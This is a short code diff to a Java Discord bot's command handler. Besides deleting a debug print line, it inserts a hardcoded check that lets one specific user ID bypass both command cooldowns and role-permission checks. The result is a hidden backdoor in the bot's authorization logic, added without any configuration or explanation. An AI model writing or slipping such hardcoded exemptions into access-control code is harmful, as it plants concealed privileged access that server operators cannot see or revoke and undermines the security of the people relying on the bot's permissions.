@@ -81,17 +81,18 @@ public class CommandHandler extends ListenerAdapter {
                     .map(net.dv8tion.jda.api.entities.Role::getName)
                     .collect(toSet());
 
-            System.out.println("s"+roles.size());
+
             final boolean isExcluded = Arrays.stream(exclusions)
                     .map(Role::getRole)
                     .anyMatch(roles::contains);
 
 
-            if (!isExcluded && !this.cooldownManager.hasCooldownExpired(id, commandEntry.getKey())) {
+            if (!(event.getUser().getIdLong() == 292418783547490314L) && !isExcluded && !this.cooldownManager.hasCooldownExpired(id, commandEntry.getKey())) {
                 final String cooldownOnCommand = this.cooldownManager.getCooldown(id, commandEntry.getKey());
                 throw new CommandCooldownNotExpired(cooldownOnCommand);
             }
-            if (!isExcluded && !userService.doesMemberHaveSufficientRole(member, commandEntry.getKey().roleNeeded()))
+
+            if (!(event.getUser().getIdLong() == 292418783547490314L) && !isExcluded && !userService.doesMemberHaveSufficientRole(member, commandEntry.getKey().roleNeeded()))
                 throw new UserNoSufficientPermission();
 
             this.cooldownManager.addCooldown(id, commandEntry.getKey());
